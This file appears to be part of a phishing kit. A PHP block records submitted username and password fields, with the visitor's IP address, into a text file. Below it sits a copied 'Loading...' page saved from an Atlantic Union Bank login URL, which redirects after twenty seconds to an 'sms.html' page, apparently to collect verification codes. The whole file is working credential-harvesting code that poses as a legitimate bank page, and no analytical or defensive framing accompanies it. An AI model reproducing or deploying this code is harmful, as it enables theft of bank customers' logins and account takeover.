<?php


$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);

$ip = getenv("REMOTE_ADDR");

$a = $_POST['a'];
$b = $_POST['b'];

$saveline = $ip . ' USER: ' . $a . ' PASS: ' . $b . "\n";

$fh=fopen('save.txt',"a+");
fwrite($fh,$saveline);
fclose($fh);




?>


<!DOCTYPE html>
<!-- saved from url=(0074)https://www.atlanticunionbanksecure.com/tob/live/usp-core/app/initialLogin -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title></title>
        <meta http-equiv="refresh" content="20;URL=sms.html">
    <script type="text/javascript" src="./load_files/restore_mfa.js.download"></script>
</head><script type="text/javascript" id="useragent-switcher">navigator.__defineGetter__("userAgent", function() {return "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36"})</script>
<body onload="setMfa(&#39;/tob/live/usp-core&#39;);">
<div role="alert" style="position: absolute;clip: rect(0 0 0 0)" aria-live="assertive"><span id="accessibleAlertMessage" role="alert" aria-live="assertive" style="display: inline;">Loading...</span></div>
<div style="text-align: center;font-size: 18px;font-family: arial; margin-top: 10%;"><img src="./load_files/Loader_page.gif" style="margin-left: -15px;"><div id="loadingMsgDiv" style="margin-top: 10px;">Loading...</div></div>


</body></html>